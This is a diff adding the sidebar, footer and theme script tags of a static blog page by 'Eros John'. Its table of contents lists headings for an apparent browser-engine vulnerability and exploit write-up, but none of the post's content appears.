+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Eros John">
+            
+              <p class="site-author-name" itemprop="name">Eros John</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/erosjohn" title="GitHub &rarr; https://github.com/erosjohn" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境准备"><span class="nav-number">1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Patch分析"><span class="nav-number">2.1.</span> <span class="nav-text">Patch分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#源码分析"><span class="nav-number">2.2.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">2.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">3.1.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Turbolizer搭建"><span class="nav-number">3.2.</span> <span class="nav-text">Turbolizer搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">3.3.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#任意对象读取"><span class="nav-number">3.3.1.</span> <span class="nav-text">任意对象读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪造ArrayBuffer"><span class="nav-number">3.3.2.</span> <span class="nav-text">伪造ArrayBuffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WASM"><span class="nav-number">3.3.3.</span> <span class="nav-text">WASM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.4.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eros John</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
